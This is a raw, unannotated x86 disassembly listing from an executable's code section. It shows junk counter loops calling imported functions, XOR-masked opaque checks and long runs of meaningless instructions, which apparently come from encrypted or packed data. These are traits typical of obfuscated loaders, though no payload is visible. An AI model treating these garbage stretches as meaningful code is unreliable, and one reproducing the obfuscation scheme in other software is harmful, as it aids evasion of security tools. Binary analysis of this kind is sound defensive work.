  401832:	and    DWORD PTR ds:0x430459,0x0
  40183c:	mov    esi,DWORD PTR ds:0x430459
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x430459,esi
  401849:	cmp    DWORD PTR ds:0x430459,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42ea93
  401863:	cmp    DWORD PTR ds:0x430459,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x4304e3,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x4304e3
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x4304e3,esi
  401898:	cmp    DWORD PTR ds:0x4304e3,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x4304e3,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e9ab
  4018bd:	cmp    DWORD PTR ds:0x4304e3,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x4304e3
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x4304e3,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42edd7
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42eddb,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42eddb
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42eddb,esi
  4018fe:	cmp    DWORD PTR ds:0x42eddb,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ec0f
  401914:	cmp    DWORD PTR ds:0x42eddb,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42eddb
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42eddb,esi
  40192e:	cmp    DWORD PTR ds:0x42eddb,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42edcb,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x4304db,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x4304db
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x4304db,esi
  401966:	cmp    DWORD PTR ds:0x4304db,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x4304db,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e8b7
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42ea97
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x43043d
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x430435,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x430435
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x430435,ebx
  4019c4:	cmp    DWORD PTR ds:0x430435,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e945
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e9bb
  4019e5:	cmp    DWORD PTR ds:0x430435,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x93bb393b
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a4a
  401a76:	fsubr  st,st(5)
  401a78:	mov    ebx,ebp
  401a7a:	ret    0x6d30
  401a7d:	jp     0x401af1
  401a7f:	or     ch,BYTE PTR [edi]
  401a81:	test   DWORD PTR [ebp-0x2e6a5fef],esp
  401a87:	clc    
  401a88:	retf   0xd726
  401a8b:	(bad)  
  401a8c:	jbe    0x401a75
  401a8e:	imul   ebp,DWORD PTR [esi*2-0x115ed6b8],0xe6f15b43
  401a99:	aad    0xd0
  401a9b:	sar    DWORD PTR [edi+0x59b68a0f],cl
  401aa1:	sub    esi,edx
  401aa3:	xchg   DWORD PTR [edi+edi*1+0x35],eax
  401aa7:	jno    0x401abb
  401aa9:	or     DWORD PTR ds:0x2b169f2f,ebp
  401aaf:	loopne 0x401b14
  401ab1:	scas   al,BYTE PTR es:[edi]
  401ab2:	or     ch,0x8b
  401ab5:	call   ecx
  401ab7:	dec    ebx
  401ab8:	ret    
  401ab9:	add    ch,bh
  401abb:	jg     0x401ab6
  401abd:	call   0x36314e3e
  401ac2:	mov    esp,0x8c80ce5b
  401ac7:	fwait
  401ac8:	shr    BYTE PTR [ebp-0x2a],cl
  401acb:	pop    ebp
  401acc:	inc    esi
  401acd:	jnp    0x401acb
  401acf:	cwde   
  401ad0:	or     BYTE PTR [esi+0x2e7c434a],dh
  401ad6:	mov    ch,0xe5
  401ad8:	cld    
  401ad9:	mov    ebp,0xa151e023
  401ade:	retf   
  401adf:	mov    ch,0xd
  401ae1:	inc    ecx
  401ae2:	in     eax,0xcc
  401ae4:	dec    ebp
  401ae5:	jmp    0x8fa3:0x459d0c85
  401aec:	or     edx,DWORD PTR [edx-0x504b88c8]
  401af2:	lahf   
  401af3:	test   eax,0xb5b6600
  401af8:	ss jmp 0x401b14
  401afb:	jo     0x401a81
  401afd:	ja     0x401b27
  401aff:	mov    edx,0x4d2925b9
  401b04:	pushf  
  401b05:	fwait
  401b06:	lea    eax,[ebp+0x45f5ccd2]
  401b0c:	mov    ds:0x22f842a4,al
  401b11:	sub    esi,DWORD PTR [eax]
  401b13:	push   edx
  401b14:	pop    esi
  401b15:	xchg   ebp,eax
  401b16:	push   edi
  401b17:	jmp    0x401b3e
  401b19:	and    edi,DWORD PTR [esi-0x3b]
  401b1c:	cld    
  401b1d:	and    eax,0x158b4592
  401b22:	sbb    eax,0x7ac006b3
  401b27:	mov    ch,BYTE PTR [esi-0x2b009721]
  401b2d:	mov    ds:0x3609395b,al
  401b32:	pop    edx
  401b33:	sbb    cl,BYTE PTR [edx]
  401b35:	inc    eax
  401b36:	pop    ds
  401b37:	ret    0xb311
  401b3a:	mov    edx,ds
  401b3c:	jb     0x401aeb
  401b3e:	out    0xf0,eax
  401b40:	sub    BYTE PTR [ebx+0x3b],0x63
  401b44:	fidivr WORD PTR [edx+0x12]
  401b47:	out    0xe5,eax
  401b49:	sub    ecx,DWORD PTR [ebp-0x5a05517f]
  401b4f:	push   ebp
  401b50:	mov    bh,0x3
  401b52:	div    ebp
  401b54:	mov    cl,0x9b
  401b56:	call   0x920cd874
  401b5b:	je     0x401b8e
  401b5d:	jl     0x401b95
  401b5f:	ja     0x401bcc
  401b61:	outs   dx,BYTE PTR ds:[esi]
  401b62:	cli    
  401b63:	mov    dl,0x96
  401b65:	or     eax,0xc7af2276
  401b6a:	xor    BYTE PTR [eax-0x10],ah
  401b6d:	int    0x89
  401b6f:	inc    esi
  401b70:	xor    BYTE PTR [ecx],bl
  401b72:	(bad)  
  401b74:	mov    ds:0xd53b34a6,al
  401b79:	jl     0x401b53
  401b7b:	jns    0x401b45
  401b7d:	dec    eax
  401b7e:	jno    0x401bb2
  401b80:	push   0xb2e65924
  401b85:	aad    0x41
  401b87:	jb     0x401c08
  401b89:	call   0x59dca74d
  401b8e:	mov    esp,0xdccc3120
  401b93:	shl    bl,1
  401b95:	jne    0x401bd1
  401b97:	loop   0x401c12
  401b99:	cdq    
  401b9a:	xor    DWORD PTR [edx+0x64],edx
  401b9d:	pop    edx
  401b9e:	mov    esi,0x9ca2b915
  401ba3:	fcom   QWORD PTR [ecx-0x7fb6a04e]
  401ba9:	xor    DWORD PTR [eax],eax
  401bab:	push   ss
  401bac:	scas   al,BYTE PTR es:[edi]
  401bad:	and    al,bh
  401baf:	or     eax,0x95d2ae3a
  401bb4:	add    DWORD PTR [ebx-0x63],ebx
  401bb7:	repnz mov bh,0xb6
  401bba:	loop   0x401b60
  401bbc:	test   BYTE PTR [ebx+0x58],dh
  401bbf:	in     al,0x30
  401bc1:	cmp    esi,DWORD PTR [ecx+edx*2]
  401bc4:	ins    BYTE PTR es:[edi],dx
  401bc5:	add    ah,BYTE PTR fs:[edi+0x697ef8f0]
  401bcc:	mov    ah,0xfe
  401bce:	push   cs
  401bcf:	push   eax
  401bd0:	imul   ebp,esp,0x72
  401bd3:	call   0x21e:0x8be05a49
  401bda:	push   ebx
  401bdb:	sbb    eax,0xca81dd36
  401be0:	cdq    
  401be1:	xchg   ebx,eax
  401be2:	repz call 0xb1e:0xb9d9e6d
  401bea:	test   DWORD PTR [edi+ecx*2],edx
  401bed:	les    edx,FWORD PTR [edi]
  401bef:	ss jnp 0x401c10
  401bf2:	stos   DWORD PTR es:[edi],eax
  401bf3:	jl     0x401bb5
  401bf5:	xor    eax,0xffedd313
  401bfa:	pusha  
  401bfb:	xchg   esi,eax
  401bfc:	or     al,0x5a
  401bfe:	jo     0x401c2e
  401c00:	jne    0x401c5f
  401c02:	and    al,0x99
  401c04:	sbb    BYTE PTR [eax+0x7],ah
  401c07:	in     al,0x8e
  401c09:	fs add BYTE PTR gs:[edx],dl
  401c0d:	push   ebx
  401c0e:	jle    0x401bce
  401c10:	adc    eax,0xffffffae
  401c13:	std    
  401c14:	mov    ecx,0xea773d2d
  401c19:	mov    ss,ecx
  401c1b:	lea    eax,[ebp-0xc]
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	imul   ebx,DWORD PTR [edi],0x6308cb9
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401d05
  401c9d:	loope  0x401c34
  401c9f:	bnd jl 0x401c57
  401ca2:	or     eax,0xa8fa25bc
  401ca7:	je     0x401c83
  401ca9:	sub    al,al
  401cab:	out    dx,al
  401cac:	jle    0x401d12
  401cae:	cmp    BYTE PTR [ecx+0x13119eea],ah
  401cb4:	inc    eax
  401cb5:	arpl   WORD PTR [ebp+edi*4+0x344ce3d0],di
  401cbc:	cs (bad) 
  401cbe:	and    al,BYTE PTR [ebp+0x6e27096b]
  401cc4:	jbe    0x401d1c
  401cc6:	scas   al,BYTE PTR es:[edi]
  401cc7:	loopne 0x401c59
  401cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cca:	and    eax,0xad82b1c6
  401ccf:	imul   ebx
  401cd1:	lock retf 
  401cd3:	and    eax,0xa81dcb71
  401cd8:	mov    bh,0x3
  401cda:	std    
  401cdb:	push   esp
  401cdc:	jle    0x401c88
  401cde:	outs   dx,BYTE PTR ds:[esi]
  401cdf:	ss mov esp,0xa88af7d3
  401ce5:	pop    eax
  401ce6:	out    dx,eax
  401ce7:	repz adc esi,edx
  401cea:	call   0xe0ba:0xfc86e5cd
  401cf1:	pop    edi
  401cf2:	(bad)  [edi+0x20]
  401cf5:	pop    ss
  401cf6:	pop    edx
  401cf7:	bound  esp,QWORD PTR [esi+0x31]
  401cfa:	mov    BYTE PTR [ebx-0x59],ah
  401cfd:	or     eax,0x425abc6b
  401d02:	ins    BYTE PTR es:[edi],dx
  401d03:	imul   edi,DWORD PTR [ebx-0x31],0xfdccc639
  401d0a:	inc    esp
  401d0b:	jns    0x401c8d
  401d0d:	or     BYTE PTR ds:0x955c6c4d,bl
  401d13:	inc    esp
  401d14:	popf   
  401d15:	and    ecx,edi
  401d17:	mov    dh,0xec
  401d19:	pop    edx
  401d1a:	js     0x401d05
  401d1c:	jbe    0x401d82
  401d1e:	push   esi
  401d1f:	and    DWORD PTR [eax],esi
  401d21:	jbe    0x401cd2
  401d23:	cmc    
  401d24:	xor    eax,0xd478da8b
  401d29:	pop    ebx
  401d2a:	add    esi,0x4893cd35
  401d30:	enter  0xb7ef,0xb
  401d34:	cmp    DWORD PTR [ebp+0x3d],ecx
  401d37:	sti    
  401d38:	fild   QWORD PTR [ecx+esi*4+0x7b]
  401d3c:	add    al,0x57
  401d3e:	rcl    DWORD PTR [ebp-0x1204ad08],cl
  401d44:	lock adc esi,0x6b2f84f1
  401d4b:	int    0x59
  401d4d:	xor    DWORD PTR [edx],ebp
  401d4f:	sbb    bh,BYTE PTR ds:0x654d043f
  401d55:	stos   BYTE PTR es:[edi],al
  401d56:	mov    ss,WORD PTR [edx+eiz*1-0xe]
  401d5a:	iret   
  401d5b:	jo     0x401dd4
  401d5d:	lea    eax,[eax+ebp*4]
  401d60:	es add eax,0x34e948fa
  401d66:	dec    dx
  401d68:	rol    ebp,1
  401d6a:	and    dh,ah
  401d6c:	push   edi
  401d6d:	add    BYTE PTR [esi+0x162c555],ch
  401d73:	jmp    0xb0c0d311
  401d78:	inc    ebp
  401d79:	out    dx,eax
  401d7a:	xchg   ecx,eax
  401d7b:	mov    ecx,0x4a1caf8d
  401d80:	jnp    0x401d79
  401d82:	repz jne 0x401dfa
  401d85:	push   ds
  401d86:	js     0x401d85
  401d88:	push   edi
  401d89:	pop    esi
  401d8a:	jmp    0x342b0f35
  401d8f:	into   
  401d90:	bound  esp,QWORD PTR ds:0xc874daa0
  401d96:	cli    
  401d97:	or     ebx,DWORD PTR [esi+0x75]
  401d9a:	jmp    0x17ce:0x142962a2
  401da1:	jge    0x401d8d
  401da3:	sbb    edi,DWORD PTR [ecx+0x36]
  401da6:	daa    
  401da7:	shl    bl,0xf4
  401daa:	adc    eax,0x704799eb
  401daf:	mov    ch,0x93
  401db1:	add    eax,0x785bd34f
  401db6:	pop    ds
  401db7:	lods   al,BYTE PTR ds:[esi]
  401db8:	sbb    ebx,DWORD PTR [edi+0x2d]
  401dbb:	sub    eax,0xc7968f70
  401dc0:	jbe    0x401d7e
  401dc2:	imul   eax,edi,0xffffffa3
  401dc5:	push   esp
  401dc6:	sbb    al,0xc6
  401dc8:	pop    ebx
  401dc9:	in     al,dx
  401dca:	test   DWORD PTR [edi-0x3b],0x5aa05842
  401dd1:	mov    ch,0x73
  401dd3:	add    BYTE PTR [ebx-0x5a],0xc0
  401dd7:	xbegin 0x249f9fb
  401ddd:	jo     0x401d92
  401ddf:	stos   DWORD PTR es:[edi],eax
  401de0:	sbb    ecx,eax
  401de2:	lds    eax,FWORD PTR [eax]
  401de4:	mov    dh,al
  401de6:	dec    ebp
  401de7:	dec    ebx
  401de8:	dec    ebx
  401de9:	sbb    al,0x4b
  401deb:	lods   al,BYTE PTR ds:[esi]
  401dec:	dec    esi
  401ded:	stos   WORD PTR es:[edi],ax
  401def:	and    ah,al
  401df1:	adc    eax,0xc6f55858
  401df6:	mov    ch,0x3c
  401df8:	in     eax,dx
  401df9:	dec    ebx
  401dfa:	mov    WORD PTR [eax+0x79c113f0],?
  401e00:	loope  0x401e74
  401e02:	push   es
  401e03:	int3   
  401e04:	sbb    eax,0x7a50290d
  401e09:	inc    ebp
  401e0a:	inc    ecx
  401e0b:	pop    edi
  401e0c:	test   BYTE PTR [edx+0x67],dl
  401e0f:	js     0x401e70
  401e11:	idiv   DWORD PTR [ebx]
  401e13:	or     dl,BYTE PTR [ecx+ebx*8+0x6c]
  401e17:	jo     0x401e72
  401e19:	jl     0x401dda
  401e1b:	and    DWORD PTR [esi+0x77],0xf7b29193
  401e22:	test   BYTE PTR [edi+eax*1],0xe2
  401e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e27:	xor    BYTE PTR [ebx+ecx*1],cl
  401e2a:	bound  esi,QWORD PTR [edx]
  401e2c:	mov    edx,0xca22278e
  401e31:	push   es
  401e32:	and    al,0x87
  401e34:	rcr    BYTE PTR [esi+0x4af14234],1
  401e3a:	ds mov cl,0xb3
  401e3d:	(bad)  
  401e3f:	fld    TBYTE PTR [ebp+edx*4-0x570cf7f]
  401e46:	push   eax
  401e47:	es jmp 0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	js     0x401eac
  401e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e83:	xor    DWORD PTR [edx+0x7],ebx
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e3a
  401e8d:	xor    dl,0x26
  401e90:	jmp    0x4521:0x44bdd6df
  401e97:	inc    ebp
  401e98:	push   ecx
  401e99:	out    0xb7,eax
  401e9b:	mov    ds:0x6c72ed14,al
  401ea0:	xchg   ebp,eax
  401ea1:	jnp    0x401e83
  401ea3:	cli    
  401ea4:	sbb    bl,BYTE PTR [esi+0x11]
  401ea7:	aaa    
  401ea8:	nop
  401ea9:	test   BYTE PTR [ebp-0x45],ch
  401eac:	scas   eax,DWORD PTR es:[edi]
  401ead:	aam    0x24
  401eaf:	pcmpeqw mm5,mm7
  401eb2:	retf   0xd280
  401eb5:	pop    edx
  401eb6:	clc    
  401eb7:	adc    eax,0xadeeade2
  401ebc:	sar    DWORD PTR [esi+0x3a492dd5],cl
  401ec2:	pusha  
  401ec3:	jl     0x401ea8
  401ec5:	jl     0x401e91
  401ec7:	shr    BYTE PTR [ecx+0x2],cl
  401eca:	and    esi,DWORD PTR [edx+0x48]
  401ecd:	xchg   esi,eax
  401ece:	adc    ebp,eax
  401ed0:	mov    cs,WORD PTR [ebx-0x31c1330c]
  401ed6:	test   ebp,ebp
  401ed8:	mov    al,ds:0x4123321a
  401edd:	sub    cl,BYTE PTR [ecx+0x25]
  401ee0:	or     BYTE PTR ds:0xccbfb52f,ch
  401ee6:	mov    esi,0x2b844bef
  401eeb:	in     al,0xa7
  401eed:	cmp    eax,eax
  401eef:	cmp    esp,DWORD PTR [edi-0x33]
  401ef2:	and    ch,BYTE PTR [edx-0xb]
  401ef5:	mov    DWORD PTR ds:0x7a20d959,ebx
  401efb:	aam    0x41
  401efd:	imul   ebp,ebx,0x87652b36
  401f03:	data16 xor al,0x55
  401f06:	pop    ss
  401f07:	pop    ecx
  401f08:	aam    0x50
  401f0a:	fsub   QWORD PTR [eax]
  401f0c:	adc    al,0x88
  401f0e:	jae    0x401eb7
  401f10:	addr16 cdq 
  401f12:	pop    eax
  401f13:	sar    BYTE PTR [esi-0x4fcc1b8f],cl
  401f19:	and    BYTE PTR ds:[edx+edi*1+0x97321d1],0x2e
  401f22:	mov    al,0x63
  401f24:	xchg   ebp,eax
  401f25:	push   es
  401f26:	in     eax,0xba
  401f28:	data16 scas al,BYTE PTR es:[edi]
  401f2a:	int    0xf4
  401f2c:	scas   al,BYTE PTR es:[edi]
  401f2d:	adc    esi,DWORD PTR [edx-0x31]
  401f30:	ret    0x9dc
  401f33:	inc    BYTE PTR [eax]
  401f35:	xor    BYTE PTR [ebx-0x27f753a9],cl
  401f3b:	mov    dh,0xd7
  401f3d:	push   ecx
  401f3e:	fs in  al,dx
  401f40:	(bad)  
  401f43:	out    dx,eax
  401f44:	sbb    BYTE PTR [ebp+0xf],bl
  401f47:	xchg   edi,eax
  401f48:	mov    ah,BYTE PTR [ecx+0x76]
  401f4b:	mov    cl,0x6f
  401f4d:	ins    DWORD PTR es:[edi],dx
  401f4e:	ficomp WORD PTR [esi]
  401f50:	loop   0x401ed2
  401f52:	ss mov eax,0x20bfea7c
  401f58:	test   ebp,0x87ecaef5
  401f5e:	sbb    eax,0xe932930e
  401f63:	ins    BYTE PTR es:[edi],dx
  401f64:	dec    esi
  401f65:	push   ds
  401f66:	and    cl,bh
  401f68:	sahf   
  401f69:	pop    ebp
  401f6a:	int    0x3b
  401f6c:	cmp    BYTE PTR [ebx],cl
  401f6e:	and    eax,0x765c13f1
  401f73:	pop    esi
  401f74:	xor    al,0x8a
  401f76:	gs pop edi
  401f78:	mov    eax,ds:0xc87e1c72
  401f7d:	push   ebp
  401f7e:	lock das 
  401f80:	int3   
  401f81:	psllw  mm4,QWORD PTR [edx+ebx*8-0x4cf29c29]
  401f89:	ret    0xca9b
  401f8c:	imul   ebp,DWORD PTR [esi+0x68],0xffffffbb
  401f90:	retf   0x5ca3
  401f93:	loopne 0x401f92
  401f95:	stc    
  401f96:	jmp    0x401fbb
  401f98:	lods   al,BYTE PTR ds:[esi]
  401f99:	and    edi,DWORD PTR [esi+0x1c15d1bc]
  401f9f:	jne    0x401f99
  401fa1:	imul   eax,DWORD PTR [ebx+0x6a],0x43
  401fa5:	push   ebp
  401fa6:	cmp    ebx,DWORD PTR [esi-0x9]
  401fa9:	out    0x47,al
  401fab:	out    dx,al
  401fac:	cmp    esp,DWORD PTR [ecx+0x7f]
  401faf:	ins    DWORD PTR es:[edi],dx
  401fb0:	jle    0x401f5d
  401fb2:	or     bh,BYTE PTR [ecx]
  401fb4:	jge    0x401f9e
  401fb6:	push   es
  401fb7:	cdq    
  401fb8:	aaa    
  401fb9:	sbb    ah,bl
  401fbb:	cli    
  401fbc:	xchg   edx,eax
  401fbd:	inc    esi
  401fbe:	cmp    DWORD PTR [edi+0x5b],esp
  401fc1:	xor    bh,bh
  401fc3:	dec    edx
  401fc4:	ffreep st(6)
  401fc6:	imul   ebp,esp,0x23
  401fc9:	mov    ah,0x71
  401fcb:	into   
  401fcc:	(bad)  
  401fcd:	out    dx,al
  401fce:	out    0x52,eax
  401fd0:	mov    DWORD PTR [edx-0x26456b5b],edx
  401fd6:	push   es
  401fd7:	inc    esp
  401fd8:	jmp    0x4cc5:0x693d2c5f
  401fdf:	or     cl,BYTE PTR [edx+0x53]
  401fe2:	add    dh,0xd8
  401fe5:	jle    0x402060
  401fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fe8:	inc    edx
  401fe9:	bound  esp,QWORD PTR [ecx+0x43bbabd5]
  401fef:	out    dx,eax
  401ff0:	xchg   BYTE PTR [esi-0x7a],bh
  401ff3:	shl    BYTE PTR [ebx+edi*4+0xf2a1fcf],1
  401ffa:	dec    eax
  401ffb:	xchg   esp,eax
  401ffc:	add    ch,bh
  401ffe:	or     eax,0x2720a4e5
  402003:	sub    al,0x36
  402005:	es push ebx
  402007:	int    0xc3
  402009:	mov    edx,0xc3762748
  40200e:	test   DWORD PTR [eax+0x71],eax
  402011:	pop    eax
  402012:	iret   
  402013:	rcl    esi,1
  402015:	dec    ecx
  402016:	out    0x99,al
  402018:	cmp    DWORD PTR [edi-0x26626cde],0x98dcfb40
  402022:	dec    esp
  402023:	icebp  
  402024:	jae    0x402077
  402026:	sub    eax,0x45ce7ffe
  40202b:	pop    DWORD PTR [edx+esi*8-0x26]
  40202f:	out    0xd6,al
  402031:	pushf  
  402032:	add    eax,esi
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	and    al,0x34
  4020e6:	cli    
  4020e7:	xor    BYTE PTR [ebp+eax*1+0x7f557e7e],al
  4020ee:	jle    0x40216e
  4020f0:	cmp    al,bl
  4020f2:	loop   0x402133
  4020f4:	lea    ecx,[edi]
  4020f6:	ret    0x25b9
  4020f9:	push   eax
  4020fa:	aaa    
  4020fb:	sbb    DWORD PTR [ecx],ecx
  4020fd:	inc    esi
  4020fe:	push   ebp
  4020ff:	and    BYTE PTR [ebx],0xcb
  402102:	outs   dx,BYTE PTR ds:[esi]
  402103:	sub    cl,BYTE PTR [edi+0x4d]
  402106:	stos   DWORD PTR es:[edi],eax
  402107:	outs   dx,BYTE PTR ds:[esi]
  402108:	push   ss
  402109:	shl    BYTE PTR [esi-0xb],0x30
  40210d:	or     al,0xa6
  40210f:	add    eax,0xa29f4fef
  402114:	out    dx,al
  402115:	xlat   BYTE PTR es:[ebx]
  402117:	fidiv  DWORD PTR [ebp-0x50]
  40211a:	sahf   
  40211b:	jmp    0x7d58:0xe452ae4c
  402122:	jge    0x402173
  402124:	sbb    esp,eax
  402126:	in     eax,0xb7
  402128:	and    BYTE PTR [eax],bh
  40212a:	xor    DWORD PTR [edi+0x13],eax
  40212d:	inc    edi
